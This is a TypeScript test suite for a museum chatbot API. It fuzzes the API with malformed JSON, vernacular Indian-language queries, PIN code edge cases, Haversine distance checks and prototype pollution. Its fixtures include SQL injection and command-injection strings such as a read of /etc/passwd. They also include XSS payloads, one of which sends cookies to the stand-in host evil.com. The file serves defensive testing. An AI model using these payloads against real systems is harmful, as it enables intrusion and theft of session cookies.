/**
 * Tier 5: Adversarial Coverage Hardening and Empirical Verification Test Suite
 * 
 * Target Domains:
 * 1. API Injection Attacks, Malformed JSON Bodies, Non-ASCII/Unicode/Emoji Queries, SQLi/XSS Payloads
 * 2. PIN Code Edge Cases: Invalid Alphabetic, Whitespace, Out-of-Range PINs, International Postcodes
 * 3. Haversine Precision Boundary Tests: Antipodal Points, Micro-Distances, Extreme Coordinate Probes
 * 4. Rapid Multi-Turn Chat Simulation Across 12+ Diverse Indian Museum Instances
 * 5. Prototype Pollution, Heavy Payload Resilience & Memory Stability
 * 
 * Usage:
 *   npx tsx tests/e2e/tier5_adversarial.ts
 */

import fs from 'fs';
import path from 'path';
import {
  TestResult,
  runTest,
  assert,
  assertEqual,
  assertInRange,
  assertNonEmptyString,
  dynamicImport,
  colors,
} from './types';
import { calculateHaversineDistance, Museum } from '@/lib/museums';

const TIER = 'Tier 5: Adversarial Hardening';

export async function runTier5Tests(): Promise<TestResult[]> {
  const results: TestResult[] = [];

  // =========================================================================
  // 1. API INJECTION, MALFORMED JSON & PROTOCOL FUZZING
  // =========================================================================

  results.push(
    await runTest(TIER, 'API Fuzzing: Malformed JSON Bodies & Corrupted Payloads Return HTTP 400', async () => {
      const routePath = path.join(process.cwd(), 'app', 'api', 'museum-chat', 'route.ts');
      assert(fs.existsSync(routePath), `Route handler missing at ${routePath}`);
      const routeModule = await dynamicImport('app/api/museum-chat/route.ts');

      const corruptedBodies = [
        { desc: 'Unclosed JSON curly brace', raw: '{"museumId": "mus-in-del-001", "message": "hello"' },
        { desc: 'Invalid syntax with unquoted keys', raw: '{museumId: mus-in-del-001}' },
        { desc: 'Trailing comma invalid JSON', raw: '{"museumId": "mus-in-del-001", "message": "test",}' },
        { desc: 'Empty raw string', raw: '' },
        { desc: 'Raw number primitive', raw: '123456789' },
        { desc: 'Raw boolean primitive', raw: 'true' },
        { desc: 'Raw null string', raw: 'null' },
        { desc: 'Raw array root', raw: '["mus-in-del-001", "hello"]' },
      ];

      for (const tc of corruptedBodies) {
        const mockReq = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: tc.raw,
        });

        const res = await routeModule.POST(mockReq);
        assert(
          res.status === 400,
          `Expected HTTP 400 for corrupted JSON (${tc.desc}), but got HTTP ${res.status}`
        );
        const data = await res.json();
        assert(
          data.status === 'error',
          `Expected status 'error' for corrupted JSON (${tc.desc}), got '${data.status}'`
        );
      }
    })
  );

  results.push(
    await runTest(TIER, 'API Security: SQL Injection & Command Injection Payloads Defended', async () => {
      const routeModule = await dynamicImport('app/api/museum-chat/route.ts');

      const sqliMuseumIds = [
        "' OR '1'='1",
        "mus-in-del-001'; DROP TABLE museums; --",
        "' UNION SELECT id, name, pincode FROM museums --",
        "admin'--",
        '" OR ""="',
        "mus-in-del-001' AND 1=1 UNION ALL SELECT NULL,NULL,NULL--",
        "mus-in-del-001 && cat /etc/passwd",
        "1; EXEC xp_cmdshell('dir')",
      ];

      for (const maliciousId of sqliMuseumIds) {
        const mockReq = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: maliciousId,
            message: 'What are the visiting hours?',
          }),
        });

        const res = await routeModule.POST(mockReq);
        // Malicious non-existent museum IDs should safely return 404 (or 400) without crashing
        assert(
          res.status === 404 || res.status === 400,
          `Expected HTTP 404/400 for SQLi museumId payload "${maliciousId}", got HTTP ${res.status}`
        );
        const data = await res.json();
        assert(
          data.status === 'error',
          `Expected error status for SQLi museumId payload "${maliciousId}", got "${data.status}"`
        );
      }

      // SQLi in user query message with a valid museum ID
      const sqliMessages = [
        "' OR 1=1 --",
        "'; SELECT * FROM users WHERE '1'='1",
        "Robert'); DROP TABLE Students;--",
        "UNION SELECT null, username, password FROM users--",
      ];

      for (const maliciousMsg of sqliMessages) {
        const mockReq = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: 'mus-in-del-001',
            message: maliciousMsg,
          }),
        });

        const res = await routeModule.POST(mockReq);
        assert(
          res.status === 200,
          `Expected HTTP 200 for valid museum with SQLi message string, got HTTP ${res.status}`
        );
        const data = await res.json();
        assert(
          data.status === 'ok' || data.status === 'fallback',
          `Expected ok/fallback status, got "${data.status}"`
        );
        assertNonEmptyString(data.reply, 'Expected non-empty reply for SQLi-containing user query');
      }
    })
  );

  results.push(
    await runTest(TIER, 'API Security: XSS & HTML Script Tag Injection Payloads Handled Safely', async () => {
      const routeModule = await dynamicImport('app/api/museum-chat/route.ts');

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(document.cookie)">',
        '<svg/onload="fetch(`http://evil.com/${document.cookie}`)">',
        'javascript:alert(1)',
        '<iframe src="https://attacker.site"></iframe>',
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>',
        '<body onload=alert(1)>',
        '"><script>eval(atob("YWxlcnQoMSk="))</script>',
      ];

      for (const xss of xssPayloads) {
        const mockReq = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: 'mus-in-del-001',
            message: `Tell me about the museum: ${xss}`,
            chatHistory: [
              { role: 'user', content: `Hello ${xss}` },
              { role: 'assistant', content: `Welcome ${xss}` },
            ],
          }),
        });

        const res = await routeModule.POST(mockReq);
        assert(res.status === 200, `Expected HTTP 200 for XSS payload string, got ${res.status}`);
        const data = await res.json();
        assertNonEmptyString(data.reply, 'Expected non-empty reply string');
        assert(typeof data.reply === 'string', 'Reply must be valid string');
      }
    })
  );

  results.push(
    await runTest(TIER, 'API Multilingual: Vernacular Indian Scripts, Emoji Queries & Zero-Width Chars', async () => {
      const routeModule = await dynamicImport('app/api/museum-chat/route.ts');

      const vernacularQueries = [
        {
          lang: 'Hindi (Devanagari)',
          museumId: 'mus-in-del-001',
          query: 'राष्ट्रीय संग्रहालय नई दिल्ली के खुलने का समय और टिकट का शुल्क क्या है?',
          expectedKeywords: ['national museum', '10:00', '18:00', 'opening', 'time', 'hours', 'शुल्क', 'टिकट'],
        },
        {
          lang: 'Tamil',
          museumId: 'mus-in-che-001',
          query: 'சென்னை அரசு அருங்காட்சியகத்தின் கட்டணம் மற்றும் நேரம் என்ன? சோழர் வெண்கல சிலைகள் உள்ளதா?',
          expectedKeywords: ['chennai', 'nataraja', 'chola', 'bronze', 'egmore', 'hours', 'fee'],
        },
        {
          lang: 'Bengali',
          museumId: 'mus-in-kol-001',
          query: 'ভারতীয় জাদুঘর কলকাতায় কি কি দেখার আছে এবং প্রবেশ মূল্য কত?',
          expectedKeywords: ['indian museum', 'kolkata', 'fee', 'inr', 'artifact'],
        },
        {
          lang: 'Marathi',
          museumId: 'mus-in-pun-001',
          query: 'राजा दिनकर केळकर वस्तुसंग्रहालयाची वेळ आणि तिकिटाचे दर काय आहेत?',
          expectedKeywords: ['kelkar', 'pune', 'hours', 'fee', 'timings'],
        },
        {
          lang: 'Gujarati',
          museumId: 'mus-in-lot-001',
          query: 'લોથલ પુરાતત્વીય સંગ્રહાલય ક્યારે ખુલે છે અને ક્યાં આવેલું છે?',
          expectedKeywords: ['lothal', 'hours', 'schedule', 'museum'],
        },
        {
          lang: 'Emoji & Unicode Glyphs',
          museumId: 'mus-in-del-001',
          query: '🏛️ 🕒 🎟️ ♿ 👨‍👩‍👧‍👦 Are wheelchairs available at National Museum? \u200B\u200C\uFEFF',
          expectedKeywords: ['wheelchair', 'accessible', 'facilities', 'national museum'],
        },
      ];

      for (const vq of vernacularQueries) {
        const mockReq = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: vq.museumId,
            message: vq.query,
          }),
        });

        const res = await routeModule.POST(mockReq);
        assert(res.status === 200, `Expected HTTP 200 for ${vq.lang} query, got ${res.status}`);
        const data = await res.json();
        assertNonEmptyString(data.reply, `Expected valid reply for ${vq.lang}`);
        assert(data.status === 'ok' || data.status === 'fallback', `Expected status ok/fallback, got ${data.status}`);
        
        const replyLower = data.reply.toLowerCase();
        const hasKeyword = vq.expectedKeywords.some((kw) => replyLower.includes(kw.toLowerCase()));
        assert(
          hasKeyword,
          `Reply for ${vq.lang} did not match expected context keywords. Reply: "${data.reply}"`
        );
      }
    })
  );

  // =========================================================================
  // 2. PIN CODE RESOLVER ADVERSARIAL STRESS TESTING
  // =========================================================================

  results.push(
    await runTest(TIER, 'PIN Resolver: International Postcodes & Alphabetic Formats Safely Rejected', async () => {
      const { resolvePinToCoordinates } = await dynamicImport('lib/pincodes.ts');

      const internationalPostcodes = [
        { code: '90210', desc: 'US 5-digit ZIP code (Beverly Hills)' },
        { code: '10001', desc: 'US 5-digit ZIP code (New York)' },
        { code: '94105-0001', desc: 'US ZIP+4 format' },
        { code: 'SW1A 1AA', desc: 'UK Postcode (Buckingham Palace)' },
        { code: 'EC1A 1BB', desc: 'UK Postcode (London)' },
        { code: 'K1A 0B1', desc: 'Canadian Postal Code (Ottawa)' },
        { code: '2000', desc: 'Australian 4-digit Postcode (Sydney)' },
        { code: '75008', desc: 'French 5-digit Postcode (Paris)' },
        { code: '10115', desc: 'German 5-digit Postcode (Berlin)' },
        { code: '100-0001', desc: 'Japanese hyphenated Postal Code (Tokyo)' },
        { code: '000000', desc: 'All zeros' },
        { code: '011001', desc: 'Leading zero 6-digit string' },
        { code: '099999', desc: 'Leading zero invalid postal circle' },
        { code: '999999', desc: 'Invalid unassigned 9-series circle' },
        { code: '-110011', desc: 'Negative PIN code string' },
        { code: '+110011', desc: 'Positive prefixed PIN code string' },
        { code: '110011.0', desc: 'Floating point string format' },
        { code: '1e5', desc: 'Scientific notation string' },
        { code: '11 00 11', desc: 'Inner spaced PIN code' },
        { code: '110-011', desc: 'Hyphenated PIN code' },
      ];

      for (const item of internationalPostcodes) {
        const result = resolvePinToCoordinates(item.code);
        assert(
          result === null,
          `Expected resolvePinToCoordinates to return null for ${item.desc} ("${item.code}"), but got: ${JSON.stringify(result)}`
        );
      }
    })
  );

  results.push(
    await runTest(TIER, 'PIN Resolver: Whitespace Trimming & Type Boundary Resilience', async () => {
      const { resolvePinToCoordinates } = await dynamicImport('lib/pincodes.ts');

      // Valid PINs wrapped in extraneous whitespace should cleanly resolve
      const validWhitespacePins = [
        { raw: '  110011  ', expectedCity: 'Delhi' },
        { raw: '\t600008\n', expectedCity: 'Chennai' },
        { raw: '\r\n302004\r\n', expectedCity: 'Jaipur' },
        { raw: ' 411002 ', expectedCity: 'Pune' },
        { raw: ' 695033 ', expectedCity: 'Thiruvananthapuram' },
      ];

      for (const item of validWhitespacePins) {
        const resolved = resolvePinToCoordinates(item.raw);
        assert(
          resolved !== null,
          `Expected resolvePinToCoordinates to resolve trimmed valid PIN "${item.raw}", but got null`
        );
        assertNonEmptyString(resolved!.locationName, 'Expected location name');
        assert(
          resolved!.coords.lat > 8.0 && resolved!.coords.lat < 38.0,
          `Latitude for "${item.raw}" out of bounds: ${resolved!.coords.lat}`
        );
      }

      // Non-string types passed via type-casting should not crash
      const nonStringInputs = [
        null as unknown as string,
        undefined as unknown as string,
        110011 as unknown as string,
        {} as unknown as string,
        [] as unknown as string,
        true as unknown as string,
      ];

      for (const nonStr of nonStringInputs) {
        const res = resolvePinToCoordinates(nonStr);
        assertEqual(
          res,
          null,
          `Expected null for non-string input ${typeof nonStr} (${String(nonStr)})`
        );
      }
    })
  );

  // =========================================================================
  // 3. HAVERSINE PRECISION & GEODESIC BOUNDARY TESTS
  // =========================================================================

  results.push(
    await runTest(TIER, 'Haversine: Micro-Distance & Sub-Meter Precision Boundaries', async () => {
      const baseLat = 28.6118;
      const baseLon = 77.2193;

      // 1. Identical coordinates -> 0.0 km
      const dZero = calculateHaversineDistance(baseLat, baseLon, baseLat, baseLon);
      assertEqual(dZero, 0, 'Distance between identical points must be exactly 0.0');

      // 2. Micro distance: 0.00001 deg lat separation (~1.11 meters) -> 0.0 km
      const dMicro = calculateHaversineDistance(baseLat, baseLon, baseLat + 0.00001, baseLon);
      assertEqual(dMicro, 0, 'Sub-meter offset (1.1m) rounded to 1 decimal must be 0.0 km');
      assert(!Number.isNaN(dMicro), 'Micro distance must not be NaN');

      // 3. Small distance: 0.001 deg lat separation (~111 meters) -> 0.1 km
      const dSmall = calculateHaversineDistance(baseLat, baseLon, baseLat + 0.001, baseLon);
      assertEqual(dSmall, 0.1, '111-meter offset must round to 0.1 km');

      // 4. Moderate distance: 0.01 deg lat separation (~1.11 km) -> 1.1 km
      const d1km = calculateHaversineDistance(baseLat, baseLon, baseLat + 0.01, baseLon);
      assertInRange(d1km, 1.0, 1.2, '0.01 deg lat separation should be ~1.1 km');
    })
  );

  results.push(
    await runTest(TIER, 'Haversine: Antipodal Points & Extreme Coordinate Geodesics', async () => {
      // 1. Exact Antipodal Coordinates: Equator (0,0) vs (0, 180) -> Earth Half Circumference ~20,015 km
      const dAntipodalEquator = calculateHaversineDistance(0, 0, 0, 180);
      assert(!Number.isNaN(dAntipodalEquator), 'Antipodal equator distance must not be NaN');
      assertInRange(
        dAntipodalEquator,
        20000,
        20030,
        `Expected ~20015 km for equatorial antipodal points, got ${dAntipodalEquator}`
      );

      // 2. Exact North Pole (90, 0) to South Pole (-90, 0) -> ~20,015 km
      const dPoles = calculateHaversineDistance(90, 0, -90, 0);
      assert(!Number.isNaN(dPoles), 'Pole-to-pole distance must not be NaN');
      assertInRange(
        dPoles,
        20000,
        20030,
        `Expected ~20015 km between North and South poles, got ${dPoles}`
      );

      // 3. Date line crossing: (0, 179.9) to (0, -179.9) -> 0.2 deg across date line -> ~22.2 km
      const dDateLine = calculateHaversineDistance(0, 179.9, 0, -179.9);
      assertInRange(
        dDateLine,
        20.0,
        25.0,
        `Expected ~22.2 km across date line, got ${dDateLine}`
      );

      // 4. Quarter-Earth Geodesic: (0, 0) to (0, 90) -> ~10,007.5 km
      const dQuarter = calculateHaversineDistance(0, 0, 0, 90);
      assertInRange(
        dQuarter,
        9990,
        10020,
        `Expected ~10008 km for quarter circumference, got ${dQuarter}`
      );
    })
  );

  results.push(
    await runTest(TIER, 'Spatial Engine: Extreme Boundary Geographic Coordinate Probes', async () => {
      const { findNearestMuseum } = await dynamicImport('lib/pincodes.ts');
      const dataFilePath = path.join(process.cwd(), 'data', 'indian-museums.json');
      const allMuseums: Museum[] = JSON.parse(fs.readFileSync(dataFilePath, 'utf-8'));

      // 1. Extreme North Probe: Northernmost Kashmir coordinates (35.5°N, 75.0°E)
      const northProbe = findNearestMuseum({ lat: 35.5, lon: 75.0 }, allMuseums);
      assert(Boolean(northProbe.nearestMuseum), 'Must resolve nearest museum for northern probe');
      assert(
        northProbe.nearestMuseum.id.includes('jam') ||
        northProbe.nearestMuseum.state.includes('Jammu') ||
        northProbe.nearestMuseum.state.includes('Ladakh') ||
        northProbe.nearestMuseum.id.includes('leh'),
        `Northern probe should resolve to Jammu/Ladakh museum, got: ${northProbe.nearestMuseum.name}`
      );

      // 2. Extreme South Probe: Southern tip / Indian Ocean (6.5°N, 77.0°E)
      const southProbe = findNearestMuseum({ lat: 6.5, lon: 77.0 }, allMuseums);
      assert(Boolean(southProbe.nearestMuseum), 'Must resolve nearest museum for southern probe');
      assert(
        southProbe.nearestMuseum.id.includes('trv') || southProbe.nearestMuseum.state.includes('Kerala'),
        `Southern probe should resolve to Thiruvananthapuram/Kerala museum, got: ${southProbe.nearestMuseum.name}`
      );

      // 3. Extreme West Probe: Western Rann of Kutch (23.5°N, 68.5°E)
      const westProbe = findNearestMuseum({ lat: 23.5, lon: 68.5 }, allMuseums);
      assert(Boolean(westProbe.nearestMuseum), 'Must resolve nearest museum for western probe');
      assert(
        westProbe.nearestMuseum.state === 'Gujarat',
        `Western probe should resolve to Gujarat museum, got: ${westProbe.nearestMuseum.name}`
      );

      // 4. Extreme East Probe: Easternmost Arunachal/Assam border (27.5°N, 95.5°E)
      const eastProbe = findNearestMuseum({ lat: 27.5, lon: 95.5 }, allMuseums);
      assert(Boolean(eastProbe.nearestMuseum), 'Must resolve nearest museum for eastern probe');
      const neStates = ['Assam', 'Meghalaya', 'Manipur', 'Sikkim', 'Arunachal Pradesh', 'Nagaland', 'Mizoram', 'Tripura'];
      assert(
        neStates.includes(eastProbe.nearestMuseum.state),
        `Eastern probe should resolve to NE museum, got: ${eastProbe.nearestMuseum.name}`
      );

      // 5. Far Ocean Probe: (0.0°N, 80.0°E) - verify distance calculation doesn't throw or produce NaN
      const oceanProbe = findNearestMuseum({ lat: 0.0, lon: 80.0 }, allMuseums);
      assert(Boolean(oceanProbe.nearestMuseum), 'Ocean probe must return nearest museum');
      assert(oceanProbe.distanceKm > 900, `Expected distance > 900 km from equator, got ${oceanProbe.distanceKm}`);
      assert(!Number.isNaN(oceanProbe.distanceKm), 'Ocean probe distance must not be NaN');
    })
  );

  // =========================================================================
  // 4. RAPID MULTI-TURN CHAT SIMULATION ACROSS 12 MUSEUM INSTANCES
  // =========================================================================

  results.push(
    await runTest(TIER, 'Multi-Turn Chat: Rapid Simulation Across 12 Diverse Indian Museums', async () => {
      const routeModule = await dynamicImport('app/api/museum-chat/route.ts');

      const museumTestBatch = [
        { id: 'mus-in-del-001', name: 'National Museum, New Delhi', city: 'New Delhi' },
        { id: 'mus-in-che-001', name: 'Government Museum, Chennai', city: 'Chennai' },
        { id: 'mus-in-kol-001', name: 'Indian Museum, Kolkata', city: 'Kolkata' },
        { id: 'mus-in-jai-001', name: 'Albert Hall Museum, Jaipur', city: 'Jaipur' },
        { id: 'mus-in-pun-001', name: 'Raja Dinkar Kelkar Museum, Pune', city: 'Pune' },
        { id: 'mus-in-trv-001', name: 'Napier Museum, Thiruvananthapuram', city: 'Thiruvananthapuram' },
        { id: 'mus-in-ahm-001', name: 'Sardar Vallabhbhai Patel National Memorial', city: 'Ahmedabad' },
        { id: 'mus-in-lot-001', name: 'Archaeological Museum, Lothal', city: 'Lothal' },
        { id: 'mus-in-shl-001', name: 'Don Bosco Museum, Shillong', city: 'Shillong' },
        { id: 'mus-in-jam-001', name: 'Dogra Art Museum, Jammu', city: 'Jammu' },
        { id: 'mus-in-pan-001', name: 'Goa State Museum, Panaji', city: 'Panaji' },
        { id: 'mus-in-bho-001', name: 'Indira Gandhi Rashtriya Manav Sangrahalaya', city: 'Bhopal' },
      ];

      // Execute 4-turn stateful conversational sequence across all 12 museums
      const simPromises = museumTestBatch.map(async (m) => {
        const history: Array<{ role: 'user' | 'assistant'; content: string }> = [];

        // Turn 1: Operating hours
        const req1 = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: m.id,
            message: `What are the visiting hours and open days for ${m.name}?`,
            chatHistory: history,
          }),
        });
        const res1 = await routeModule.POST(req1);
        assertEqual(res1.status, 200, `Turn 1 failed for ${m.id}`);
        const data1 = await res1.json();
        assertNonEmptyString(data1.reply, `Turn 1 empty reply for ${m.id}`);
        assertEqual(data1.museumId, m.id, `Turn 1 museumId mismatch for ${m.id}`);
        history.push({ role: 'user', content: `What are the visiting hours for ${m.name}?` });
        history.push({ role: 'assistant', content: data1.reply });

        // Turn 2: Entry Fees
        const req2 = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: m.id,
            message: 'How much are the ticket prices for domestic vs international visitors?',
            chatHistory: history,
          }),
        });
        const res2 = await routeModule.POST(req2);
        assertEqual(res2.status, 200, `Turn 2 failed for ${m.id}`);
        const data2 = await res2.json();
        assertNonEmptyString(data2.reply, `Turn 2 empty reply for ${m.id}`);
        history.push({ role: 'user', content: 'How much are the ticket prices?' });
        history.push({ role: 'assistant', content: data2.reply });

        // Turn 3: Accessibility Features
        const req3 = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: m.id,
            message: 'Are wheelchair ramps and accessible facilities available here?',
            chatHistory: history,
          }),
        });
        const res3 = await routeModule.POST(req3);
        assertEqual(res3.status, 200, `Turn 3 failed for ${m.id}`);
        const data3 = await res3.json();
        assertNonEmptyString(data3.reply, `Turn 3 empty reply for ${m.id}`);
        history.push({ role: 'user', content: 'Are wheelchair ramps available?' });
        history.push({ role: 'assistant', content: data3.reply });

        // Turn 4: Highlights / Special artifacts
        const req4 = new Request('http://localhost:3000/api/museum-chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            museumId: m.id,
            message: 'What are the main famous exhibits and highlights to see in this collection?',
            chatHistory: history,
          }),
        });
        const res4 = await routeModule.POST(req4);
        assertEqual(res4.status, 200, `Turn 4 failed for ${m.id}`);
        const data4 = await res4.json();
        assertNonEmptyString(data4.reply, `Turn 4 empty reply for ${m.id}`);

        return { museumId: m.id, turnsCompleted: 4 };
      });

      const simulationResults = await Promise.all(simPromises);
      assertEqual(
        simulationResults.length,
        12,
        'All 12 museum multi-turn simulations must execute successfully'
      );
      for (const sr of simulationResults) {
        assertEqual(sr.turnsCompleted, 4, `Museum ${sr.museumId} did not complete 4 turns`);
      }
    })
  );

  // =========================================================================
  // 5. PROTOTYPE POLLUTION, LARGE PAYLOAD RESILIENCE & HISTORY DEEP DEFENSE
  // =========================================================================

  results.push(
    await runTest(TIER, 'API Hardening: Prototype Pollution Payloads & Deep History Resilience', async () => {
      const routeModule = await dynamicImport('app/api/museum-chat/route.ts');

      // 1. Prototype pollution attempt in payload
      const maliciousPayload = JSON.parse(
        '{"__proto__": {"polluted": true, "isAdmin": true}, "museumId": "mus-in-del-001", "message": "Is prototype polluted?"}'
      );

      const protoReq = new Request('http://localhost:3000/api/museum-chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(maliciousPayload),
      });

      const protoRes = await routeModule.POST(protoReq);
      assertEqual(protoRes.status, 200, 'Route should safely handle request without prototype corruption');
      assert((Object.prototype as any).polluted === undefined, 'Object.prototype must NOT be polluted');
      assert((Object.prototype as any).isAdmin === undefined, 'Object.prototype must NOT be polluted');

      // 2. Large conversation history (50 messages)
      const massiveHistory: Array<{ role: 'user' | 'assistant'; content: string }> = [];
      for (let i = 0; i < 50; i++) {
        massiveHistory.push({
          role: i % 2 === 0 ? 'user' : 'assistant',
          content: `Simulated conversation turn history message content index #${i} detailing museum features.`,
        });
      }

      const heavyReq = new Request('http://localhost:3000/api/museum-chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          museumId: 'mus-in-del-001',
          message: 'What are the timings?',
          chatHistory: massiveHistory,
        }),
      });

      const heavyRes = await routeModule.POST(heavyReq);
      assertEqual(heavyRes.status, 200, 'Route should gracefully process deep history array');
      const heavyData = await heavyRes.json();
      assertNonEmptyString(heavyData.reply, 'Expected non-empty reply for deep history request');
    })
  );

  return results;
}

// Standalone execution entrypoint
if (require.main === module || (typeof process !== 'undefined' && process.argv[1]?.includes('tier5_adversarial'))) {
  (async () => {
    console.log(`\n${colors.bright}${colors.cyan}========================================================================${colors.reset}`);
    console.log(`${colors.bright}${colors.cyan}🛡️   DIGITAL MUSE - TIER 5 ADVERSARIAL STRESS TEST HARNESS${colors.reset}`);
    console.log(`${colors.dim}    Coverage: Fuzzing, SQLi/XSS Injection, Vernacular Unicode, PIN Edge Cases,${colors.reset}`);
    console.log(`${colors.dim}              Antipodal Geodesics, and 12-Museum Rapid Multi-Turn Simulation${colors.reset}`);
    console.log(`${colors.bright}${colors.cyan}========================================================================${colors.reset}\n`);

    const start = Date.now();
    const results = await runTier5Tests();
    const duration = Date.now() - start;

    const passed = results.filter((r) => r.passed).length;
    const failed = results.filter((r) => !r.passed).length;

    for (const res of results) {
      if (res.passed) {
        console.log(`  ${colors.green}✔ PASS${colors.reset} ${res.name} ${colors.gray}(${res.durationMs}ms)${colors.reset}`);
      } else {
        console.log(`  ${colors.red}✖ FAIL${colors.reset} ${res.name} ${colors.gray}(${res.durationMs}ms)${colors.reset}`);
        if (res.error) {
          console.log(`    ${colors.red}Error: ${res.error}${colors.reset}`);
        }
      }
    }

    console.log(`\n${colors.bright}${colors.cyan}========================================================================${colors.reset}`);
    console.log(`| Total: ${results.length.toString().padEnd(4)} | Passed: ${colors.green}${passed.toString().padEnd(4)}${colors.reset} | Failed: ${failed > 0 ? colors.red : colors.green}${failed.toString().padEnd(4)}${colors.reset} | Time: ${(duration + 'ms').padEnd(8)} |`);
    console.log(`${colors.bright}${colors.cyan}========================================================================${colors.reset}\n`);

    if (failed === 0) {
      console.log(`${colors.bright}${colors.green}✨ 100% PASS: ALL TIER 5 ADVERSARIAL STRESS TESTS PASSED SUCCESSFULLY!${colors.reset}\n`);
      process.exit(0);
    } else {
      console.log(`${colors.bright}${colors.red}✖ ${failed} ADVERSARIAL TESTS FAILED.${colors.reset}\n`);
      process.exit(1);
    }
  })().catch((err) => {
    console.error('Fatal execution error:', err);
    process.exit(1);
  });
}
